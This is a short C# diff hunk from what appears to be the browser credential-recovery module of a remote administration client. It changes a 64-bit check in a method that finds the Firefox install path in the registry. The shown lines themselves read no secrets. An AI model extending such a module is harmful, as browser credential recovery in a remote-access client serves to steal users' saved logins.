@@ -202,7 +202,7 @@ namespace xClient.Core.Recovery.Browsers
         private static DirectoryInfo GetFirefoxInstallPath()
         {
             // get firefox path from registry
-            using (RegistryKey key = PlatformHelper.Architecture == 64 ?
+            using (RegistryKey key = PlatformHelper.Is64Bit ?
                 RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
                     @"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox") :
                 RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
